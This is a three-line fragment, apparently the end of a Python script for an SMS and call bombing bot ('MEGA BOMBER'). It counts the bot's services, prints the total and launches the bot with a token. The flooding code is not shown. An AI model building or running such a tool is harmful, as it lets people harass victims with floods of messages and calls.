    calls = len(MegaBomber().get_call_services())
    print(f"\nMEGA BOMBER: {sms} SMS + {calls} CALL = {sms+calls} servicios")
    bot.run(TOKEN)
